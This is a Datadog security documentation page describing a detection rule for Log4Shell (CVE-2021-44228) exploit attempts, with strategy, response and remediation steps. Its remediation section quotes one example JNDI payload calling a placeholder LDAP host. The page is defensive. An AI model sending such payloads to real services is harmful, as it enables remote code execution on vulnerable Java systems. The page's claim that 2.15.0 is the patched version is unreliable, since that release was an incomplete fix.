# Source: https://docs.datadoghq.com/security/default_rules/pd3-xlj-up0.md

---
title: Log4shell RCE attempts - CVE-2021-44228
description: Datadog, the leading service for cloud-scale monitoring.
breadcrumbs: Docs > Datadog Security > OOTB Rules > Log4shell RCE attempts - CVE-2021-44228
---

# Log4shell RCE attempts - CVE-2021-44228
Tactic:[TA0001-initial-access](https://attack.mitre.org/tactics/TA0001)Technique:[T1190-exploit-public-facing-application](https://attack.mitre.org/techniques/T1190)
### Goal{% #goal %}

Detect attempts to exploit the log4j vulnerability (CVE-2021-44228).

The vulnerability has [CVSS Score: 10.0 CRITICAL](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) and can lead to Remote Code Execution (RCE).

### Strategy{% #strategy %}

Monitor payload matching the known patterns for CVE-2021-44228 (event rule: #sqr-000-017) and generate an Application Security signal with `Info` severity if at least 10 attacks are targeting a service running a Java application.

### Response{% #response %}

Consider blocking the attacking IP(s) temporarily to prevent them to reach deeper parts of your production systems.

### Remediation{% #remediation %}

First, check if the impacted web service uses a vulnerable version of the log4j module. Versions from 2.0-beta9 through 2.12.1, and 2.13.0 through 2.14.1, including 2.15.0-rc1 - are vulnerable.

If vulnerable, apply the following remediations to prevent exploit of the Log4Shell vulnerability:

- Update log4j to the latest patched version immediately (>= 2.15.0)
- Disable lookups by setting `formatMsgNoLookups=true`. Only available from log4j >= 2.10 versions
- Use a non-vulnerable or empty implementation of the class `org.apache.logging.log4j.core.lookup.JndiLookup`

Finally, investigate evidences of log containing malicious payload like `${jndi:ldap://x.x.x.x/#Touch}` through Datadog App & API Protection's [Investigate](https://app.datadoghq.com/security/appsec/traces) .
